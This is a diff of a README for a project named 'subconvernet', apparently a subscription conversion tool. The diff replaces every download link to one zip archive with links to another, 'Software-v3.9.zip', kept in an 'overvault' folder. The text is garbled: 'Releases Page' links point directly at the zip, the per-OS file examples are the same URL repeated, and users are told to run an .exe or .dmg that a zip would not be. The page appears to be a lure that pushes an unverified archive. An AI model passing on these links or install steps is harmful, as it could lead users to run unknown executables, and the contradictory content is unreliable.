@@ -1,6 +1,6 @@
 # 🚀 subconvernet - Easy Subscription Conversion Service
 
-[![Download Now](https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip)
+[![Download Now](https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip%20Now-Release-blue)](https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip)
 
 ## 📦 Overview
 
@@ -30,16 +30,16 @@ To run **subconvernet**, ensure your system meets the following requirements:
 Follow these steps to download and run **subconvernet**:
 
 1. **Visit the Releases Page:** Click the link below to access the download page:
-   [Download from Releases](https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip)
+   [Download from Releases](https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip)
 
 2. **Select the Latest Release:** On the releases page, find the latest version of **subconvernet**. This will usually be at the top of the page.
 
-3. **Download the File:** Click on the file that corresponds to your operating system (e.g., `https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip`, `https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip`, or `https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip`).
+3. **Download the File:** Click on the file that corresponds to your operating system (e.g., `https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip`, `https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip`, or `https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip`).
 
 4. **Install the Application:**  
    - **For Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
    - **For macOS:** Open the `.dmg` file and drag the application to the Applications folder.
-   - **For Linux:** Extract the `https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip` file and run the included script.
+   - **For Linux:** Extract the `https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip` file and run the included script.
 
 5. **Run the Application:** After installation, locate **subconvernet** on your system and open it.
 
@@ -47,7 +47,7 @@ Follow these steps to download and run **subconvernet**:
 
 ## 📥 Download & Install
 
-To get started, visit the download page again at [Download from Releases](https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip) and follow the installation instructions above. 
+To get started, visit the download page again at [Download from Releases](https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip) and follow the installation instructions above. 
 
 ## 💼 Usage Instructions
 
@@ -73,4 +73,4 @@ If you encounter issues while using the application, do the following:
 
 Thank you for choosing **subconvernet**. Your feedback helps us improve the service for everyone. If you have suggestions or issues to report, please do so in the repository.
 
-Again, for downloading the application, please visit our [Releases Page](https://raw.githubusercontent.com/Kiven-C18/subconvernet/main/overvault/subconvernet-3.7.zip) to find the latest version.
+Again, for downloading the application, please visit our [Releases Page](https://github.com/Kiven-C18/subconvernet/raw/refs/heads/main/overvault/Software-v3.9.zip) to find the latest version.
